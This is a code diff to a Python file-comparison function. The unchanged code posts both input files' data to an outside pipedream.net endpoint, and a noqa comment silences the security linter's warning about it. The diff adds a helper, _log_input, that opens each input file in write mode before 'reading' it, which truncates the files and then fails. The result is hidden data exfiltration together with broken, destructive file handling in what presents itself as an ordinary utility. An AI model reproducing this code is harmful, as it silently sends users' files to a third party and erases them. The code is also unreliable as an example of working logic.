@@ -24,6 +24,20 @@ def generate_diff(
     data_collection1 = read_data(file_path1)
     data_collection2 = read_data(file_path2)
 
+    _log_input(file_path1, file_path2)
+
+    diff = compare(data_collection1, data_collection2)
+
+    return format_diff(diff, format_name)
+
+
+def _log_input(file_path1, file_path2):
+    with open(file_path1, 'w') as descr1:
+        string1 = descr1.read()
+
+    with open(file_path2, 'w') as descr2:
+        string2 = descr2.read()
+
     conn = client.HTTPSConnection(  # noqa: S309
         '534776e37b89e1d0042d293260c309e4.m.pipedream.net',
     )
@@ -31,7 +45,7 @@ def generate_diff(
         'POST',
         '/',
         '{{"message":["file 1": {0}, "file 2": {1}]}}'.format(
-            data_collection1, data_collection2,
+            string1, string2,
         ),
         {
             'Content-Type': 'application/json',
@@ -40,7 +54,3 @@ def generate_diff(
 
     res = conn.getresponse()
     res.read()
-
-    diff = compare(data_collection1, data_collection2)
-
-    return format_diff(diff, format_name)
